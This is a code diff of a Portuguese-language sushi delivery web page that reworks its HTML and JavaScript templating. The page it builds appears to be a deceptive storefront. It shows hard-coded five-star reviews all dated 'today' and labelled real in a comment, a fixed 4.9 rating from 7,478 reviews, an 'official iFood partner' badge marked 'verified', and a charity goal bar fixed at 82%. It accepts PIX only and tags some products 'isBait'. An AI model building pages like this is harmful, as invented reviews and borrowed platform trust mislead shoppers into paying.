-\"                    </div>\" +
-\"                    <span class='text-[10px] text-gray-400'>Hoje</span>\" +
-\"                </div>\" +
-\"                <p class='text-xs text-gray-600 italic'>\\\"Melhor custo benefício que já vi. O peixe está muito fresco, chegou rápido.\\\"</p>\" +
-\"            </div>\" +
-\"            <div class='bg-white p-4 rounded-xl border border-gray-100 shadow-sm'>\" +
-\"                <div class='flex justify-between items-start mb-2'>\" +
-\"                    <div class='flex items-center gap-2'>\" +
-\"                        <div class='w-8 h-8 rounded-full bg-pink-100 flex items-center justify-center font-bold text-pink-600 text-xs'>AB</div>\" +
-\"                        <div><h4 class='text-xs font-bold text-gray-800'>Amanda Borges</h4><div class='flex text-[10px] text-[#fbbf24]'><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i></div></div>\" +
-\"                    </div>\" +
-\"                    <span class='text-[10px] text-gray-400'>Hoje</span>\" +
-\"                </div>\" +
-\"                <p class='text-xs text-gray-600 italic'>\\\"O Hot Roll veio crocante de verdade! Embalagem impecável.\\\"</p>\" +
-\"            </div>\" +
-\"            <div class='bg-white p-4 rounded-xl border border-gray-100 shadow-sm'>\" +
-\"                <div class='flex justify-between items-start mb-2'>\" +
-\"                    <div class='flex items-center gap-2'>\" +
-\"                        <div class='w-8 h-8 rounded-full bg-blue-100 flex items-center justify-center font-bold text-blue-600 text-xs'>JP</div>\" +
-\"                        <div><h4 class='text-xs font-bold text-gray-800'>João Paulo</h4><div class='flex text-[10px] text-[#fbbf24]'><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i><i class='fa-solid fa-star-half-stroke'></i></div></div>\" +
-\"                    </div>\" +
-\"                    <span class='text-[10px] text-gray-400'>Hoje</span>\" +
-\"                </div>\" +
-\"                <p class='text-xs text-gray-600 italic'>\\\"Vi no TikTok e resolvi testar. Entrega super rápida e sushi de qualidade.\\\"</p>\" +
-\"            </div>\" +
-\"            <div class='bg-white p-4 rounded-xl border border-gray-100 shadow-sm'>\" +
-\"                <div class='flex justify-between items-start mb-2'>\" +
-\"                    <div class='flex items-center gap-2'>\" +
-\"                        <div class='w-8 h-8 rounded-full bg-orange-100 flex items-center justify-center font-bold text-orange-600 text-xs'>LH</div>\" +
-\"                        <div><h4 class='text-xs font-bold text-gray-800'>Letícia Helena</h4><div class='flex text-[10px] text-[#fbbf24]'><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i></div></div>\" +
-\"                    </div>\" +
-\"                    <span class='text-[10px] text-gray-400'>Hoje</span>\" +
-\"                </div>\" +
-\"                <p class='text-xs text-gray-600 italic'>\\\"Combo Haki maravilhoso. Comemos em 3 e ficamos satisfeitos!\\\"</p>\" +
-\"            </div>\" +
-\"            <div class='bg-white p-4 rounded-xl border border-gray-100 shadow-sm'>\" +
-\"                <div class='flex justify-between items-start mb-2'>\" +
-\"                    <div class='flex items-center gap-2'>\" +
-\"                        <div class='w-8 h-8 rounded-full bg-green-100 flex items-center justify-center font-bold text-green-600 text-xs'>CC</div>\" +
-\"                        <div><h4 class='text-xs font-bold text-gray-800'>Claudio C.</h4><div class='flex text-[10px] text-[#fbbf24]'><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i><i class='fa-solid fa-star'></i></div></div>\" +
-\"                    </div>\" +
-\"                    <span class='text-[10px] text-gray-400'>Hoje</span>\" +
-\"                </div>\" +
-\"                <p class='text-xs text-gray-600 italic'>\\\"A entrega grátis realmente funciona e não demora. Gostei muito.\\\"</p>\" +
-\"            </div>\" +
-\"            <button class='w-full py-3 text-[#EA1D2C] text-xs font-bold border border-gray-200 rounded-xl bg-white active:bg-gray-50 transition'>\" +
-\"                Faça seu primeiro pedido para avaliar!\" +
-\"            </button>\" +
-\"        </div>\" +
-\"    </section>\" +
-\"    <footer class='bg-white border-t border-gray-200 mt-8 pt-10 pb-32 px-6 text-center relative'>\" +
-\"            <div class='flex flex-col items-center justify-center mb-6'>\" +
-\"                <div class='w-16 h-16 bg-white rounded-full flex items-center justify-center mb-3 shadow-sm border border-gray-100 p-1'><img src='images/logo-rushi.webp' class='w-full h-full object-cover rounded-full'></div>\" +
-\"                <h2 class='text-lg font-bold text-[#3e3e3e]'>Rūshī Sushi</h2>\" +
-\"                <p class='text-[10px] text-gray-400 uppercase tracking-widest mt-1'>CNPJ: 57.272.601/0001-12</p>\" +
-\"            </div>\" +
-\"            <div class='flex flex-wrap justify-center gap-2 mb-8 max-w-xs mx-auto'>\" +
-\"                <button onclick='openInstitucional(\\\"sobre\\\")' class='px-4 py-2 bg-[#fafafa] text-gray-600 text-xs font-semibold rounded-full border border-gray-100 hover:bg-gray-100 transition'>Sobre Nós</button>\" +
-\"                <button onclick='openInstitucional(\\\"privacidade\\\")' class='px-4 py-2 bg-[#fafafa] text-gray-600 text-xs font-semibold rounded-full border border-gray-100 hover:bg-gray-100 transition'>Privacidade</button>\" +
-\"                <button onclick='openInstitucional(\\\"termos\\\")' class='px-4 py-2 bg-[#fafafa] text-gray-600 text-xs font-semibold rounded-full border border-gray-100 hover:bg-gray-100 transition'>Termos</button>\" +
-\"                <button onclick='openInstitucional(\\\"trocas\\\")' class='px-4 py-2 bg-[#fafafa] text-gray-600 text-xs font-semibold rounded-full border border-gray-100 hover:bg-gray-100 transition'>Trocas</button>\" +
-\"            </div>\" +
-\"            <div class='flex justify-center gap-4 mb-8'>\" +
-\"                <a href='https://www.instagram.com/rushisushioficial/' target='_blank' rel='noopener noreferrer' class='w-10 h-10 rounded-full bg-pink-50 flex items-center justify-center text-pink-600 shadow-sm border border-pink-100 hover:bg-pink-100 transition'><i class='fa-brands fa-instagram text-lg'></i></a>\" +
-\"            </div>\" +
-\"            <div class='text-[10px] text-gray-400 border-t border-gray-100 pt-6'>\" +
-\"                <p>&copy; 2026 Rūshī Sushi Delivery.</p>\" +
-\"                <p>Feito com <i class='fa-solid fa-heart text-[#EA1D2C] text-[8px]'></i> para você.</p>\" +
-\"            </div>\" +
-\"    </footer>\" +
+                    <!-- Divisória Sutil -->
+                    <div class="w-full h-[1px] bg-gray-100 mb-2"></div>
+
+                    <!-- Linha de Avaliação (Alinhada à esquerda estilo iFood) -->
+                    <div class="flex items-center justify-between w-full py-2 cursor-pointer active:bg-gray-50 transition rounded-lg text-left">
+                                    <div class="flex items-center gap-2">
+                                          <i class="fa-solid fa-star text-[#fbbf24] text-xs"></i>
+                                          <span class="text-[#3e3e3e] font-bold text-sm">4.9 <span class="text-gray-400 font-normal ml-0.5">(7.478 avaliações)</span></span>
+                                          <div class="flex items-center gap-1 bg-[#EA1D2C] text-white px-2 py-0.5 rounded-full scale-90 origin-left">
+                                                <i class="fa-solid fa-star text-[8px]"></i>
+                                                <span class="text-[9px] font-black uppercase tracking-tighter">Super</span>
+                                          </div>
+                                    </div>
+                                    <i class="fa-solid fa-chevron-right text-gray-300 text-[10px]"></i>
+                              </div>
+
+                    <!-- Divisória Sutil -->
+                    <div class="w-full h-[1px] bg-gray-100 mb-2"></div>
+
+                    <!-- Informação de Entrega (Alinhada à esquerda) -->
+                    <div class="flex flex-col w-full text-left py-1">
+                        <div class="text-[14px] text-[#3e3e3e] font-medium">
+                            Entrega padrão (30-50 min) <span class="text-[#05a65a] font-bold ml-1">Grátis</span>
+                        </div>
+                        <div class="text-[13px] text-gray-400 mt-0.5 font-medium">
+                            Mais opções disponíveis na sacola
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="px-4 mt-5">
+      <div class="bg-white rounded-2xl border border-gray-100 shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden">
+        <!-- Parte Superior: Causa Social -->
+        <div class="bg-gradient-to-r from-amber-50 to-orange-50 p-4 relative group">
+          <div class="absolute -right-2 -bottom-2 opacity-10 group-hover:scale-110 transition-transform duration-500">
+              <i class="fa-solid fa-paw text-5xl text-amber-600 rotate-12"></i>
+          </div>
+          
+          <div class="flex items-start gap-3 relative z-10">
+              <div class="w-10 h-10 rounded-xl bg-white shadow-sm flex items-center justify-center shrink-0 border border-amber-100">
+                  <i class="fa-solid fa-dog text-amber-600 text-lg"></i>
+              </div>
+              <div class="flex flex-col">
+                  <div class="flex items-center gap-2">
+                      <span class="text-[13px] font-bold text-amber-900">Ação Amigo de Patas 🐾</span>
+                      <span class="bg-amber-600 text-white text-[8px] font-black px-1.5 py-0.5 rounded uppercase tracking-wider">Causa Ativa</span>
+                  </div>
+                  <p class="text-[11px] text-amber-800/80 leading-tight mt-1">
+                      Cada pedido ajuda no resgate de animais. Nossos valores promocionais apoiam esta missão! ❤️
+                  </p>
+              </div>
+          </div>
+          
+          <!-- Barra de Progresso Integrada -->
+          <div class="mt-3">
+              <div class="w-full bg-amber-200/30 rounded-full h-1.5 overflow-hidden">
+                  <div class="bg-amber-500 h-full w-[82%] rounded-full relative">
+                      <div class="absolute inset-0 bg-white/20 animate-loading-bar"></div>
+                  </div>
+              </div>
+              <div class="flex justify-between items-center text-[9px] font-bold text-amber-700 mt-1 uppercase">
+                  <span>Meta de Refeições</span>
+                  <span>82% Atingido</span>
+              </div>
+          </div>
+        </div>
+
+        <!-- Divisor com Icone de Conexão -->
+        <div class="relative flex items-center justify-center py-1 bg-white">
+            <div class="absolute inset-x-0 top-1/2 h-px bg-gray-50"></div>
+            <div class="relative bg-white px-3">
+                <i class="fa-solid fa-link text-[10px] text-gray-300"></i>
+            </div>
+        </div>
+
+        <!-- Parte Inferior: Parceiro iFood -->
+        <div class="p-4 pt-1 flex items-center gap-3">
+          <div class="w-10 h-10 rounded-xl bg-[#fff1f2] flex items-center justify-center shrink-0 border border-red-50">
+            <img src="images/ifood-smile.png" alt="iFood" class="w-7 h-7 object-contain" />
+          </div>
+          <div class="flex flex-col min-w-0 flex-1">
+            <div class="flex items-center gap-1.5">
+              <span class="text-[13px] font-bold text-[#3e3e3e] truncate">Parceiro Oficial iFood</span>
+              <i class="fa-solid fa-circle-check text-[#EA1D2C] text-[11px]"></i>
+            </div>
+            <span class="text-[11px] text-gray-500 truncate">Cupom de boas-vindas liberado</span>
+          </div>
+          <div class="flex flex-col items-end gap-1">
+              <span class="text-[9px] font-black text-[#EA1D2C] bg-[#fff1f2] px-2 py-0.5 rounded-full border border-red-100">VERIFICADO</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="sticky top-0 bg-white z-30 border-b border-gray-100 mt-5 cat-tabs-wrap">
+        <div class="flex overflow-x-auto no-scroll px-4">
+            <button onclick="scrollToCat('destaques', event)" class="nav-item active">Destaques</button>
+            <button onclick="scrollToCat('entradas', event)" class="nav-item">Entradas</button>
+            <button onclick="scrollToCat('temakis', event)" class="nav-item">Temakis</button>
+            <button onclick="scrollToCat('familia', event)" class="nav-item">Família</button>
+            <button onclick="scrollToCat('classicos', event)" class="nav-item">Clássicos</button>
+            <button onclick="scrollToCat('hot-rolls', event)" class="nav-item">Quentes</button>
+            <button onclick="scrollToCat('yakisobas', event)" class="nav-item">Yakisobas</button>
+            <button onclick="scrollToCat('sobremesas', event)" class="nav-item">Sobremesas</button>
+            <button onclick="scrollToCat('bebidas', event)" class="nav-item">Bebidas</button>
+        </div>
+    </div>
+
+    <main class="p-4 space-y-6 min-h-screen bg-[#ffffff]" id="product-container"></main>
+
+    <!-- ========================================== -->
+        <!-- 🟢 NOVA SEÇÃO: FAQ (Design Clean) -->
+        <!-- ========================================== -->
+        <section class="bg-[#ffffff] mt-2 pt-4 pb-2">
+            <div class="px-4">
+                <h3 class="font-bold text-[#3e3e3e] text-lg mb-4 flex items-center gap-2">
+                    <i class="fa-regular fa-comments text-[#EA1D2C]"></i> 
+                    Dúvidas Frequentes
+                </h3>
+                
+                <div class="space-y-2">
+                    <!-- Pergunta 1 -->
+                    <div class="bg-white border border-gray-100 rounded-xl shadow-sm overflow-hidden faq-item">
+                        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center p-4 text-left font-semibold text-sm text-gray-700 active:bg-gray-50 transition">
+                            <span>Qual o prazo de entrega?</span>
+                            <i class="fa-solid fa-chevron-down text-[#EA1D2C] text-xs transition-transform duration-300 faq-icon"></i>
+                        </button>
+                        <div class="hidden px-4 pb-4 text-xs text-gray-500 leading-relaxed faq-content">
+                            <div class="pt-2 border-t border-gray-50">
+                                Nosso prazo médio é de <strong>30 a 45 minutos</strong>. Em dias de chuva ou alta demanda, esse tempo pode variar levemente, mas sempre prezamos pela agilidade.
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Pergunta 2 -->
+                    <div class="bg-white border border-gray-100 rounded-xl shadow-sm overflow-hidden faq-item">
+                        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center p-4 text-left font-semibold text-sm text-gray-700 active:bg-gray-50 transition">
+                            <span>Quais formas de pagamento?</span>
+                            <i class="fa-solid fa-chevron-down text-[#EA1D2C] text-xs transition-transform duration-300 faq-icon"></i>
+                        </button>
+                        <div class="hidden px-4 pb-4 text-xs text-gray-500 leading-relaxed faq-content">
+                            <div class="pt-2 border-t border-gray-50">
+                                Aceitamos <strong>PIX (Aprovação Imediata)</strong>. É a forma mais rápida e segura. Seu pedido vai direto para a cozinha assim que o pagamento é confirmado.
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Pergunta 3 -->
+                    <div class="bg-white border border-gray-100 rounded-xl shadow-sm overflow-hidden faq-item">
+                        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center p-4 text-left font-semibold text-sm text-gray-700 active:bg-gray-50 transition">
+                            <span>Os produtos são frescos?</span>
+                            <i class="fa-solid fa-chevron-down text-[#EA1D2C] text-xs transition-transform duration-300 faq-icon"></i>
+                        </button>
+                        <div class="hidden px-4 pb-4 text-xs text-gray-500 leading-relaxed faq-content">
+                            <div class="pt-2 border-t border-gray-50">
+                                <strong>Sim! Absolutamente.</strong> Recebemos peixe fresco todos os dias. Não trabalhamos com estoque congelado de sushis prontos. Tudo é feito na hora.
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Pergunta 4 -->
+                    <div class="bg-white border border-gray-100 rounded-xl shadow-sm overflow-hidden faq-item">
+                        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center p-4 text-left font-semibold text-sm text-gray-700 active:bg-gray-50 transition">
+                            <span>Horário de Funcionamento</span>
+                            <i class="fa-solid fa-chevron-down text-[#EA1D2C] text-xs transition-transform duration-300 faq-icon"></i>
+                        </button>
+                        <div class="hidden px-4 pb-4 text-xs text-gray-500 leading-relaxed faq-content">
+                            <div class="pt-2 border-t border-gray-50">
+                                Estamos abertos <strong>24 Horas</strong>! Madrugada, manhã, tarde ou noite: bateu a fome, o Rūshī Sushi entrega.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    <!-- SEÇÃO DE REVIEWS REAIS -->
+    <section class="px-4 mt-8 mb-4">
+        <h3 class="font-bold text-[#3e3e3e] text-lg mb-4 flex items-center gap-2">
+            <i class="fa-solid fa-star text-[#fbbf24]"></i> 
+            O que dizem nossos clientes
+        </h3>
+        
+        <div class="space-y-3">
+            <div class="bg-white p-4 rounded-xl border border-gray-100 shadow-sm">
+                <div class="flex justify-between items-start mb-2">
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-500 text-xs">RM</div>
+                        <div><h4 class="text-xs font-bold text-gray-800">Ricardo Mello</h4><div class="flex text-[10px] text-[#fbbf24]"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div></div>
+                    </div>
+                    <span class="text-[10px] text-gray-400">Hoje</span>
+                </div>
+                <p class="text-xs text-gray-600 italic">"Melhor custo benefício que já vi. O peixe está muito fresco, chegou rápido."</p>
+            </div>
+
+            <div class="bg-white p-4 rounded-xl border border-gray-100 shadow-sm">
+                <div class="flex justify-between items-start mb-2">
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 rounded-full bg-pink-100 flex items-center justify-center font-bold text-pink-600 text-xs">AB</div>
+                        <div><h4 class="text-xs font-bold text-gray-800">Amanda Borges</h4><div class="flex text-[10px] text-[#fbbf24]"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div></div>
+                    </div>
+                    <span class="text-[10px] text-gray-400">Hoje</span>
+                </div>
+                <p class="text-xs text-gray-600 italic">"O Hot Roll veio crocante de verdade! Embalagem impecável."</p>
+            </div>
+
+            <div class="bg-white p-4 rounded-xl border border-gray-100 shadow-sm">
+                <div class="flex justify-between items-start mb-2">
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 rounded-full bg-blue-100 flex items-center justify-center font-bold text-blue-600 text-xs">JP</div>
+                        <div><h4 class="text-xs font-bold text-gray-800">João Paulo</h4><div class="flex text-[10px] text-[#fbbf24]"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star-half-stroke"></i></div></div>
+                    </div>
+                    <span class="text-[10px] text-gray-400">Hoje</span>
+                </div>
+                <p class="text-xs text-gray-600 italic">"Vi no TikTok e resolvi testar. Entrega super rápida e sushi de qualidade."</p>
+            </div>
+
+            <div class="bg-white p-4 rounded-xl border border-gray-100 shadow-sm">
+                <div class="flex justify-between items-start mb-2">
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 rounded-full bg-orange-100 flex items-center justify-center font-bold text-orange-600 text-xs">LH</div>
+                        <div><h4 class="text-xs font-bold text-gray-800">Letícia Helena</h4><div class="flex text-[10px] text-[#fbbf24]"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div></div>
+                    </div>
+                    <span class="text-[10px] text-gray-400">Hoje</span>
+                </div>
+                <p class="text-xs text-gray-600 italic">"Combo Haki maravilhoso. Comemos em 3 e ficamos satisfeitos!"</p>
+            </div>
+
+            <div class="bg-white p-4 rounded-xl border border-gray-100 shadow-sm">
+                <div class="flex justify-between items-start mb-2">
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 rounded-full bg-green-100 flex items-center justify-center font-bold text-green-600 text-xs">CC</div>
+                        <div><h4 class="text-xs font-bold text-gray-800">Claudio C.</h4><div class="flex text-[10px] text-[#fbbf24]"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div></div>
+                    </div>
+                    <span class="text-[10px] text-gray-400">Hoje</span>
+                </div>
+                <p class="text-xs text-gray-600 italic">"A entrega grátis realmente funciona e não demora. Gostei muito."</p>
+            </div>
+
+            <button class="w-full py-3 text-[#EA1D2C] text-xs font-bold border border-gray-200 rounded-xl bg-white active:bg-gray-50 transition">
+                Faça seu primeiro pedido para avaliar!
+            </button>
+        </div>
+    </section>
+
+    <footer class="bg-white border-t border-gray-200 mt-8 pt-10 pb-32 px-6 text-center relative">
+            <div class="flex flex-col items-center justify-center mb-6">
+                <div class="w-16 h-16 bg-white rounded-full flex items-center justify-center mb-3 shadow-sm border border-gray-100 p-1"><img src="images/logo-rushi.webp" class="w-full h-full object-cover rounded-full"></div>
+                <h2 class="text-lg font-bold text-[#3e3e3e]">Rūshī Sushi</h2>
+                <p class="text-[10px] text-gray-400 uppercase tracking-widest mt-1">CNPJ: 57.272.601/0001-12</p>
+            </div>
+            <div class="flex flex-wrap justify-center gap-2 mb-8 max-w-xs mx-auto">
+                <button onclick="openInstitucional('sobre')" class="px-4 py-2 bg-[#fafafa] text-gray-600 text-xs font-semibold rounded-full border border-gray-100 hover:bg-gray-100 transition">Sobre Nós</button>
+                <button onclick="openInstitucional('privacidade')" class="px-4 py-2 bg-[#fafafa] text-gray-600 text-xs font-semibold rounded-full border border-gray-100 hover:bg-gray-100 transition">Privacidade</button>
+                <button onclick="openInstitucional('termos')" class="px-4 py-2 bg-[#fafafa] text-gray-600 text-xs font-semibold rounded-full border border-gray-100 hover:bg-gray-100 transition">Termos</button>
+                <button onclick="openInstitucional('trocas')" class="px-4 py-2 bg-[#fafafa] text-gray-600 text-xs font-semibold rounded-full border border-gray-100 hover:bg-gray-100 transition">Trocas</button>
+            </div>
+            <div class="flex justify-center gap-4 mb-8">
+                <a href="https://www.instagram.com/rushisushioficial/" target="_blank" rel="noopener noreferrer" class="w-10 h-10 rounded-full bg-pink-50 flex items-center justify-center text-pink-600 shadow-sm border border-pink-100 hover:bg-pink-100 transition"><i class="fa-brands fa-instagram text-lg"></i></a>
+            </div>
+            <div class="text-[10px] text-gray-400 border-t border-gray-100 pt-6">
+                <p>&copy; 2026 Rūshī Sushi Delivery.</p>
+                <p>Feito com <i class="fa-solid fa-heart text-[#EA1D2C] text-[8px]"></i> para você.</p>
+            </div>
+    </footer>
 
     <div id="cart-bar" class="fixed bottom-0 left-0 w-full bg-white z-40 transition-transform transform translate-y-full shadow-[0_-4px_14px_rgba(0,0,0,0.10)] mb-safe border-t border-gray-100">
         <!-- Barra de progresso / cupom (topo) -->
@@ -669,8 +722,8 @@
         </div>
     </div>
 
-\"    <script src='https://cdnjs.cloudflare.com/ajax/libs/imask/6.4.3/imask.min.js'></script>\" +
-\"    <script src='https://cdn.jsdelivr.net/npm/sweetalert2@11'></script>\" +
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/imask/6.4.3/imask.min.js"><\/script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"><\/script>
 
     <script>
         const API_BASE_URL = "";
@@ -816,7 +869,7 @@
             const el = document.getElementById("header-location-info");
             if (el) {
                 // Adicionamos a barra invertida \ antes do $ para o código não quebrar
-                el.innerText = cidade + " - " + estado;
+                el.innerText = \`\${cidade} - \${estado}\`;
             }
         }
 
@@ -829,7 +882,7 @@
             if (stateData) {
                 const { value: city } = await Swal.fire({
                     title: 'Sua cidade', input: 'select', inputPlaceholder: 'Selecione a cidade', confirmButtonText: 'Confirmar', customClass: { popup: 'popup-local-container', confirmButton: 'btn-confirmar' }, allowOutsideClick: false,
-                    inputOptions: (async () => { try { const res = await fetch('https://servicodados.ibge.gov.br/api/v1/localidades/estados/' + stateData.id + '/municipios?orderBy=nome'); const cities = await res.json(); const opts = {}; cities.forEach(c => opts[c.nome] = c.nome); return opts; } catch { return {}; } })(),
+                    inputOptions: (async () => { try { const res = await fetch(\`https://servicodados.ibge.gov.br/api/v1/localidades/estados/\${stateData.id}/municipios?orderBy=nome\`); const cities = await res.json(); const opts = {}; cities.forEach(c => opts[c.nome] = c.nome); return opts; } catch { return {}; } })(),
                     inputValidator: v => !v && 'Selecione uma cidade!'
                 });
                 if (city) salvarEExibir(city, stateData.sigla);
@@ -838,14 +891,14 @@
 
         function salvarEExibir(cidade, estado) {
             localStorage.setItem("localCidade", cidade); localStorage.setItem("localEstado", estado); atualizarHeaderLocalizacao(cidade, estado);
-            Swal.fire({ html: '<div class="popup-header"><i class="fa-solid fa-circle-check" style="color:#05a65a;"></i><h2>Localização Confirmada!</h2><p style="color: #05A65A;">A loja mais próxima de você fica a 2.5Km</p></div>', confirmButtonText: 'Ver cardápio', customClass: { popup: 'popup-local-container', confirmButton: 'btn-confirmar' } });
+            Swal.fire({ html: \`<div class="popup-header"><i class="fa-solid fa-circle-check" style="color:#05a65a;"></i><h2>Localização Confirmada!</h2><p style="color: #05A65A;">A loja mais próxima de você fica a 2.5Km</p></div>\`, confirmButtonText: 'Ver cardápio', customClass: { popup: 'popup-local-container', confirmButton: 'btn-confirmar' } });
         }
 
         async function iniciarVerificacaoLocal() {
             const cidadeSalva = localStorage.getItem("localCidade"); const estadoSalvo = localStorage.getItem("localEstado");
             if (cidadeSalva && estadoSalvo) { atualizarHeaderLocalizacao(cidadeSalva, estadoSalvo); return; }
             const local = await fetchLocation();
-            Swal.fire({ html: '<div class="popup-header"><i class="fa-solid fa-map-location-dot"></i><h2>Bateu a fome de Japa?</h2><p>Confirme onde devemos entregar.</p></div><div class="location-box"><span>Detectamos você em:</span><strong>' + local.city + ' - ' + local.region + '</strong></div>', showCancelButton: true, confirmButtonText: 'É isso mesmo!', cancelButtonText: 'Mudar local', reverseButtons: true, customClass: { popup: 'popup-local-container', confirmButton: 'btn-confirmar', cancelButton: 'btn-alterar' } }).then(result => { if (result.isConfirmed) { salvarEExibir(local.city, local.region); } else if (result.dismiss === Swal.DismissReason.cancel) { escolherLocalizacaoManualmente(local.region); } });
+            Swal.fire({ html: \`<div class="popup-header"><i class="fa-solid fa-map-location-dot"></i><h2>Bateu a fome de Japa?</h2><p>Confirme onde devemos entregar.</p></div><div class="location-box"><span>Detectamos você em:</span><strong>\${local.city} - \${local.region}</strong></div>\`, showCancelButton: true, confirmButtonText: 'É isso mesmo!', cancelButtonText: 'Mudar local', reverseButtons: true, customClass: { popup: 'popup-local-container', confirmButton: 'btn-confirmar', cancelButton: 'btn-alterar' } }).then(result => { if (result.isConfirmed) { salvarEExibir(local.city, local.region); } else if (result.dismiss === Swal.DismissReason.cancel) { escolherLocalizacaoManualmente(local.region); } });
         }
 
         const commonAddons = [
@@ -937,7 +990,7 @@
             for (const [key, title] of Object.entries(cats)) {
                 const items = catalog.filter(p => p.category === key);
                 if (items.length > 0) {
-                    let html = '<div id=\"' + key + '\" class=\"mb-8 scroll-mt-32\"><h3 class=\"text-lg font-bold text-[#3e3e3e] mb-4\">' + title + '</h3><div class=\"grid gap-4\">';
+                    let html = \`<div id="\${key}" class="mb-8 scroll-mt-32"><h3 class="text-lg font-bold text-[#3e3e3e] mb-4">\${title}</h3><div class="grid gap-4">\`;
                     items.forEach(p => {
                         let highlightClass = 'border-gray-100 bg-[#fafafa]'; 
                         
@@ -946,17 +999,39 @@
                                 highlightClass = 'card-destaque-master border-2 border-[#EA1D2C] bg-white'; 
                             }
                             
-                            html += '<div onclick="openProductModal(\'' + p.id + '\')" class="' + highlightClass + ' rounded-2xl border shadow-lg cursor-pointer active:scale-[0.98] transition-transform duration-200 relative overflow-hidden flex flex-col mb-2"> <div class="w-full h-48 relative bg-gray-100 z-10"> <img src="' + p.img + '" class="w-full h-full object-cover" onerror="this.src=\'images/logo-rushi.webp\'">' + (p.badge ? '<div class="absolute top-0 right-0 bg-[#EA1D2C] text-white text-[10px] font-black px-4 py-2 rounded-bl-2xl shadow-lg z-20 tracking-wider uppercase">' + p.badge + '</div>' : '') + ' </div> <div class="p-4 flex flex-col flex-1 z-10 bg-[#fafafa]"> <h4 class="text-[#3e3e3e] font-extrabold text-lg leading-tight mb-1">' + p.name + '</h4> <p class="text-sm text-gray-500 line-clamp-2 leading-relaxed mb-3">' + p.desc + '</p> <div class="flex items-center gap-3 mt-auto border-t border-gray-50 pt-3"> <span class="text-[#05a65a] font-black text-2xl">' + formatMoney(p.price) + '</span>' + (p.oldPrice ? '<span class="text-sm text-gray-400 line-through font-medium">' + formatMoney(p.oldPrice) + '</span>' : '') + (p.isBait ? '' : '') + ' </div> </div> </div>';
+                            html += \`
+                            <div onclick="openProductModal('\${p.id}')" class="\${highlightClass} rounded-2xl border shadow-lg cursor-pointer active:scale-[0.98] transition-transform duration-200 relative overflow-hidden flex flex-col mb-2">
+                                <div class="w-full h-48 relative bg-gray-100 z-10">
+                                    <img src="\${p.img}" class="w-full h-full object-cover" onerror="this.src='images/logo-rushi.webp'">
+                                    \${p.badge ? \`<div class="absolute top-0 right-0 bg-[#EA1D2C] text-white text-[10px] font-black px-4 py-2 rounded-bl-2xl shadow-lg z-20 tracking-wider uppercase">\${p.badge}</div>\` : ''}
+                                </div>
+                                <div class="p-4 flex flex-col flex-1 z-10 bg-[#fafafa]">
+                                    <h4 class="text-[#3e3e3e] font-extrabold text-lg leading-tight mb-1">\${p.name}</h4>
+                                    <p class="text-sm text-gray-500 line-clamp-2 leading-relaxed mb-3">\${p.desc}</p>
+                                    <div class="flex items-center gap-3 mt-auto border-t border-gray-50 pt-3">
+                                        <span class="text-[#05a65a] font-black text-2xl">\${formatMoney(p.price)}</span>
+                                        \${p.oldPrice ? \`<span class="text-sm text-gray-400 line-through font-medium">\${formatMoney(p.oldPrice)}</span>\` : ''}
+                                        \${p.isBait ? '<span class="text-[10px] bg-red-100 text-[#EA1D2C] px-2 py-1 rounded font-bold animate-pulse ml-auto uppercase tracking-wider shadow-sm">🔥 OFERTA</span>' : ''}
+                                    </div>
+                                </div>
+                            </div>\`;
                         } 
                         else {
                             if (p.id === 'combo-rodízio' || p.id === 'barca-ostentacao') { 
                                 highlightClass = 'card-destaque-master border-l-4 border-l-[#EA1D2C]'; 
                             }
                             
